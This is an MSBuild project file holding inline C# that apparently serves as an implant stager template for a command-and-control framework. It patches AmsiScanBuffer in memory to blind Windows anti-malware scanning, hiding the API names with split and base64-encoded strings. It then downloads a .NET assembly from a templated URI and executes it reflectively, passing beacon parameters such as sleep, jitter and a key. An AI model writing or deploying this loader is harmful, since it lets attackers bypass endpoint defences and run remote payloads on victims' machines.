<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="ExecutingIT">
   <ExecuteThings/>
  </Target>
   <UsingTask
    TaskName="ExecuteThings"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[
    using System;
    using System.IO;
    using System.Net;
    using System.Reflection;
    using System.Runtime.InteropServices;
    using System.Text;
    class Program
    {
        [DllImport("ke" + "rne" + "l32")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("ke" + "rne" + "l32")]
        private static extern IntPtr LoadLibrary(string name);

        [DllImport("ke" + "rne" + "l32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("user32.dll")]
        public static extern bool SetProcessDPIAware();

        private static void CopyData(byte[] dataStuff, IntPtr somePlaceInMem, int holderFoo = 0)
        {
            Marshal.Copy(dataStuff, holderFoo, somePlaceInMem, dataStuff.Length);
        }
        private static string Thing()
        {
            try
            {
                var fooBar = LoadLibrary(Encoding.UTF8.GetString(Convert.FromBase64String("YW1zaS" + "5kbGw=")));
                IntPtr addr = GetProcAddress(fooBar, Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5" + "CdWZmZXI=")));
                uint magicValue = 0x40;
                uint someNumber = 0;

                if (System.Environment.Is64BitOperatingSystem)
                {
                    var bigBoyBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

                    VirtualProtect(addr, (UIntPtr)bigBoyBytes.Length, magicValue, out someNumber);
                    CopyData(bigBoyBytes, addr);
                }
                else
                {
                    var smallBoyBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

                    VirtualProtect(addr, (UIntPtr)smallBoyBytes.Length, magicValue, out someNumber);
                    CopyData(smallBoyBytes, addr);

                }
                return "[+] Patched A.M.S.I!";
            }
            catch (Exception ex)
            {
                return "[!] Couldn't patch A.M.S.I :(\n" + ex.Message;
            }
        }

        private static byte[] Get(string uri)
        {
            HttpWebRequest myRequest = (HttpWebRequest)WebRequest.Create(uri);
            myRequest.Method = "GET";
            WebResponse response = myRequest.GetResponse();
            MemoryStream memoryStream = new MemoryStream();
            response.GetResponseStream().CopyTo(memoryStream);
            return memoryStream.ToArray();
        }
        public static void Main(string[] args)
        {
            Thing();
            byte[] asmb_bytes = Get("{{ csharp_uri }}");
            var asmb = Assembly.Load(asmb_bytes);
            asmb.EntryPoint.Invoke(null, new object[] { args });
        }
    }
    public class ExecuteThings : Microsoft.Build.Utilities.Task, Microsoft.Build.Framework.ITask
    {
        public override bool Execute()
        {
            Program.Main(new string[] {"{{ check_in_uri }}", "{{ key }}", "{{ sleep }}", "{{ jitter }}", "{{ endpoints }}"});
            return true;
        }
    }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>